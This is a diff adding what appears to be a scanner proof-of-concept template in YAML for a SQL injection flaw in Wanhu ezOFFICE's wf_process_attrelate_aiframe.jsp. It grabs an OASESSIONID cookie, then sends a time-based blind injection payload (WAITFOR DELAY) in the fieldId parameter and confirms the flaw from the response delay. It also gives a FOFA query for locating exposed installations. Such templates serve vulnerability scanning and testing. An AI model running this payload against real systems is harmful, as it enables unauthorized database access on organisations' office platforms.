@@ -1,0 +1,36 @@
+id: poc-yaml-whir-ezoffice-wf-process-attrelate-aiframe-jsp-sqli
+info:
+  name: 万户 ezOFFICE wf_process_attrelate_aiframe.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 万户OA ezoffice
+  fofa: app="ezOFFICE协同管理平台"
+variables:
+  random: random_int(2,6)
+  random1: random + 1
+requests:
+- method: GET
+  path: /defaultroot/login.jsp
+  expression: 'status_code == 200 &&
+
+    contains(headers,"OASESSIONID")
+
+    '
+  output:
+  - regex_match(headers,"OASESSIONID=(?P<t1>[A-Z0-9]+);")
+- method: GET
+  path: /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1;WAITFOR%20DELAY%20%270:0:{{.random}}%27--
+  headers:
+    Cookie: OASESSIONID={{.t1}};
+  expression: 'status_code == 200 &&
+
+    contains(body,"<option value=\"-1\"></option>") &&
+
+    duration > random &&
+
+    duration < random1
+
+    '
+transport: http
